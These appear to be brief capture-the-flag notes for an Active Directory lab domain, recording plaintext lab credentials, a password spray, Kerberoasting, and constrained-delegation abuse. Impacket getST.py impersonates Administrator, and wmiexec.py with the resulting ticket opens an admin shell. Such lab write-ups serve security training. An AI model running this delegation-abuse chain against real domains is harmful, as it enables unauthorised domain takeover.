# Foothold


## Potential Users
```
DB Creds
C00ctusAdm1n:B4dt0th3b0n3
COOCTUS.CORP\CRYILLIC:qwerty
password-reset:resetpassword
```

Password spray --> Cryillic
Kerberoast from Cryillic --> password-reset

password-reset
RPC

### Pywerview Notable Output
```
msds-allowedtodelegateto: oakley/DC.COOCTUS.CORP/COOCTUS.CORP,
oakley/DC.COOCTUS.CORP, 
oakley/DC,
oakley/DC.COOCTUS.CORP/COOCTUS,      
oakley/DC/COOCTUS
```


## GetST.py to create an administrator ticket
`/opt/impacket/examples/getST.py -impersonate Administrator -spn oakley/DC.COOCTUS.CORP 'COOCTUS.CORP/password-reset:resetpassword'`

`export KRB5CCNAME=$(pwd)/Administrator.ccache`

`/opt/impacket/examples/wmiexec.py COOCTUS.CORP/administrator@DC.COOCTUS.CORP -k -no-pass`

export that and use wmiexec with `-k -no-pass` to gain a shell as admin. 

Then go on a wild goose chase to find the flags :kekw: